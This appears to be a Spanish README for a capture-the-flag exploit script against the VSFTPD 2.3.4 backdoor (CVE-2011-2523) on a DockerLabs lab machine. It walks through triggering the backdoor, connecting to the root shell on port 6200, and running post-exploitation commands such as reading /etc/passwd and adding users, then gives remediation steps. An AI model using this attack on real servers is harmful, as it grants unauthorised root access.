# 🔓 Exploit VSFTPD 2.3.4 — CVE-2011-2523

Automatización del ataque al backdoor de VSFTPD 2.3.4 en la máquina **FirstHacking** de DockerLabs.

---

## 📋 Contenido

| Archivo | Descripción |
|---------|-----------|
| `exploit.py` | Script Python 3 que automatiza la explotación de CVE-2011-2523 |
| `first_hacking_writeup.md` | Análisis técnico detallado del vulnerabilidad y metodología manual |
| `README.md` | Este archivo (guía de uso) |

---

## 🎯 ¿Qué hace el exploit?

El script automatiza los siguientes pasos:

1. ✅ **Conexión Telnet al puerto FTP (21)**
   - Se conecta al servidor FTP destino
   - Espera el banner de VSFTPD 2.3.4

2. ✅ **Activación del backdoor**
   - Envía comando `USER hackerman:)` (el `:)` activa el backdoor)
   - Envía una contraseña dummy
   - Cierra la conexión Telnet

3. ✅ **Pausa de 3 segundos**
   - Permite que el servidor abra la shell en puerto 6200

4. ✅ **Conexión a puerto 6200**
   - Se conecta al socket backdoor como root
   - Abre una **shell interactiva bidireccional**

5. ✅ **Interacción en tiempo real**
   - Recibe output del servidor en vivo
   - Envía comandos desde stdin
   - Comando `exit` cierra la sesión

---

## 🚀 Uso

### Requisitos

- Python 3.6+
- Acceso de red a la máquina objetivo (puerto 21 y 6200)
- Módulos estándar (`telnetlib`, `socket`, `select`)

### Sintaxis

```bash
python3 exploit.py -host <IP_OBJETIVO>
```

### Ejemplos

#### Ejemplo 1 — Explotar máquina local en Docker

```bash
python3 exploit.py -host 172.17.0.2
```

**Output esperado:**
```
[+] Conexion exitosa a 172.17.0.2:6200 — shell abierta
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
ls -la /root
total 32
drwx------ 1 root root 4096 Jun 12 13:45 .
drwxr-xr-x 1 root root 4096 Jun 12 13:40 ..
-rw-r--r-- 1 root root  220 Nov 30  2022 .bashrc
-rw-r--r-- 1 root root   66 Nov 30  2022 .profile
exit
[+] Sesión cerrada
```

#### Ejemplo 2 — Explotar máquina remota

```bash
python3 exploit.py -host 192.168.1.100
```

---

## 🔧 Cómo funciona técnicamente

### El backdoor — CVE-2011-2523

La versión **vsftpd 2.3.4** contiene un backdoor intencionalmente inyectado en el código fuente:

- **Condición de activación:** Usuario que termina en `:)` (carita feliz)
- **Acción:** Abre una shell como `root` en puerto `6200`
- **Autenticación:** No requiere validación adicional

### Flujo del script

```
┌─────────────────────────────────────────────────────┐
│ python3 exploit.py -host 172.17.0.2                 │
└────────┬────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────┐
│ Telnet(host, 21)                                    │
│ Lee banner: "(vsFTPd 2.3.4)"                        │
└────────┬────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────┐
│ USER hackerman:)  ��� ACTIVA EL BACKDOOR              │
│ PASS pass         ← Contraseña dummy                │
│ close()                                             │
└────────┬────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────┐
│ sleep(3)          ← Espera a que el servidor abra   │
│                     la shell en puerto 6200         │
└────────┬────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────┐
│ socket.connect(host, 6200)                          │
│ "Conexion exitosa — shell abierta"                  │
└────────┬────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────┐
│ select() loop:                                      │
│ - Lee datos de socket → imprime en stdout           │
│ - Lee comandos de stdin → envía al socket           │
│ - "exit" cierra sesión                              │
└─────────────────────────────────────────────────────┘
```

---

## ⚙️ Parámetros

| Parámetro | Tipo | Obligatorio | Ejemplo | Descripción |
|-----------|------|-----------|---------|-----------|
| `-host` | string | ✅ Sí | `172.17.0.2` | IP o hostname del servidor FTP objetivo |

---

## 📊 Comandos útiles en la shell

Una vez dentro, tienes acceso root. Algunos comandos útiles:

```bash
# Ver información del sistema
uname -a
cat /etc/passwd
cat /etc/hostname

# Navegación
pwd
ls -la /root
cd /tmp

# Obtener banderas o flags
cat /root/flag.txt

# Información de red
ip addr
netstat -tuln

# Crear usuario o ejecutar acciones
useradd -m newuser
passwd newuser
```

---

## ⚠️ Limitaciones y consideraciones

| Aspecto | Descripción |
|---------|-----------|
| **Timeout** | Si el servidor tarda >3 seg en abrir puerto 6200, aumentar `time.sleep(3)` |
| **Errores de encoding** | El script usa `errors="replace"` para manejar caracteres no UTF-8 |
| **Salida sin prompt** | La shell no muestra `$` ni `#`, pero está activa |
| **Conexión perdida** | Si se desconecta, vuelve a ejecutar el exploit |
| **Soporte Linux/Unix** | Testeado en sistemas Unix/Linux (máquinas DockerLabs) |

---

## 🛡️ Remediación / Mitigación

Si administras un servidor FTP:

1. **Actualizar VSFTPD** a versión ≥ 2.3.5
2. **Verificar checksum** de binarios descargados
3. **Usar SFTP** en lugar de FTP (más seguro)
4. **Restringir acceso FTP** con firewall
5. **Monitorear puerto 6200** en IDS/IPS

---

## 📚 Referencias

- [CVE-2011-2523 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [Scary Beast Security — VSFTPD Backdoor](https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html)
- [GitHub — CVE-2011-2523 Exploits](https://github.com/topics/cve-2011-2523)

---

## 📝 Autor

**Writeup y automatización:** FirstHacking DockerLabs Challenge  
**Fecha:** 2026-06-12  
**Dificultad:** ⭐ Muy fácil

---

## ✅ Checklist de uso

```
☐ Máquina objetivo accesible (ping)
☐ Puerto 21 abierto (nmap)
☐ VSFTPD 2.3.4 confirmada
☐ Python 3 instalado
☐ Ejecutar: python3 exploit.py -host <IP>
☐ Ingresar comandos en la shell
☐ Escribir "exit" para salir
☐ Documentar hallazgos
```
